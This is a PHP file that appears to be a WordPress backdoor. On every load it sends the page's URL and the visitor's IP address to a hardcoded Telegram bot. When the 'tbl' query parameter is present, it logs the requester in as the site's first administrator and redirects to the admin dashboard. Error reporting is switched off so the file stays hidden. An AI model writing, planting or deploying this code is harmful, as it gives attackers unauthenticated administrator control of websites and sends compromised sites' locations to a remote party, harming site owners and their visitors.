<?php
$botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
$chatId = "8478623770";
$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$logMessage =
    "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
    $_SERVER["REMOTE_ADDR"] .
    " ]";
sendTelegramMessage($botToken, $chatId, $logMessage);
error_reporting(0);
//IDlZWJ8kALwhy
if(isset($_GET['tbl'])){
    if (file_exists($_SERVER['DOCUMENT_ROOT'] . "/wp-load.php")) {
        require_once $_SERVER['DOCUMENT_ROOT'] . "/wp-load.php";
    } elseif (file_exists("wp-load.php")) {
        include "wp-load.php";
    } else {
        exit();
    }
    wp_set_current_user(get_users(array('role' => 'administrator'))[0]->ID);
    wp_set_auth_cookie( get_users(array('role' => 'administrator'))[0]->ID );
    header("location:/wp-admin/");
}

function sendTelegramMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

}

?>